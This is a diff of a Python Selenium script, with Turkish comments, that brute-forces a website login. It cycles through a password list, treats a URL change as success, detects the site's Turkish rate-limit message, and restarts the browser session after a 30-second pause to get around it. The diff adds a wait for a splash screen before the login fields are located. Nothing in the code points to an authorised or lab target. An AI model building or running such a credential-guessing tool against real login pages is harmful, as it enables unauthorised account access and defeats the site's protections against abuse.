@@ -12,6 +12,7 @@ from webdriver_manager.firefox import GeckoDriverManager
 def setup_browser_session(url):
     """
     Yeni bir tarayıcı oturumu başlatır, sayfayı açar ve giriş elementlerinin yüklenmesini bekler.
+    Bu versiyon, önce yükleme ekranının kaybolmasını bekler.
     """
     print("\n[*] Yeni bir tarayıcı oturumu başlatılıyor...")
     service = FirefoxService(GeckoDriverManager().install())
@@ -19,18 +20,31 @@ def setup_browser_session(url):
     
     driver.get(url)
     
-    # Elementlerin görünür olması için 30 saniyeye kadar bekle.
-    print("[*] Sayfanın ve giriş formunun yüklenmesi bekleniyor (en fazla 30 saniye)...")
-    wait = WebDriverWait(driver, 30)
-    
+    print("[*] Sayfa yüklendi. Yükleme ekranının (splash screen) kaybolması bekleniyor...")
+    try:
+        # 1. Yükleme ekranının kaybolmasını 30 saniyeye kadar bekle.
+        # Sitenin kaynak kodunda <div class="splash-screen">...</div> gördük.
+        wait = WebDriverWait(driver, 30)
+        splash_screen_selector = (By.CLASS_NAME, "splash-screen")
+        wait.until(EC.invisibility_of_element_located(splash_screen_selector))
+        print("[*] Yükleme ekranı kayboldu.")
+
+    except TimeoutException:
+        # Eğer splash screen 30 saniyede kaybolmazsa, yine de devam etmeyi dene.
+        print("[!] Yükleme ekranı 30 saniye içinde kaybolmadı, yine de devam ediliyor...")
+
+    # 2. Şimdi giriş formunun elementlerini ara.
+    print("[*] Giriş formu elementleri aranıyor...")
+    form_wait = WebDriverWait(driver, 15) 
+
     PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
-    password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
+    password_field = form_wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
     
     USERNAME_SELECTOR = (By.XPATH, "//input[@type='password']/preceding::input[1]")
-    username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
+    username_field = form_wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
     
     LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
-    login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
+    login_button = form_wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
     
     print("[*] Giriş elementleri bulundu ve sayfa hazır.")
     return driver, username_field, password_field, login_button
@@ -86,7 +100,6 @@ def main():
                 login_button.click()
                 
                 try:
-                    # Başarı durumu: URL'nin 3 saniye içinde değişmesi
                     WebDriverWait(driver, 3).until(lambda d: args.url not in d.current_url)
                     
                     current_url = driver.current_url
@@ -97,17 +110,14 @@ def main():
                     time.sleep(30)
                     break 
                 except TimeoutException:
-                    # Giriş başarısız. Şimdi rate limit mesajını kontrol et.
                     try:
                         rate_limit_xpath = "//*[contains(text(), 'Çok fazla istek gönderdiniz') or contains(text(), 'daha sonra tekrar deneyiniz')]"
                         WebDriverWait(driver, 1).until(EC.visibility_of_element_located((By.XPATH, rate_limit_xpath)))
                         
-                        # Rate limit mesajı bulundu.
                         print("\n[!] Rate limit mesajı tespit edildi! Oturum yeniden başlatılacak.")
                         rate_limited = True
-                        break # İç döngüden çık ve oturumu yeniden başlat.
+                        break 
                     except TimeoutException:
-                        # Rate limit mesajı yok, normal hatalı şifre. Devam et.
                         continue
         
         except Exception as e:
@@ -122,7 +132,6 @@ def main():
             break
 
         if rate_limited or (not found_password and current_password_index < len(passwords)):
-            # Eğer rate limit olduysa veya başka bir hatadan dolayı döngü kırıldıysa, bekle.
             print("[!] Yeni oturumdan önce 30 saniye bekleniyor...")
             time.sleep(30)
     
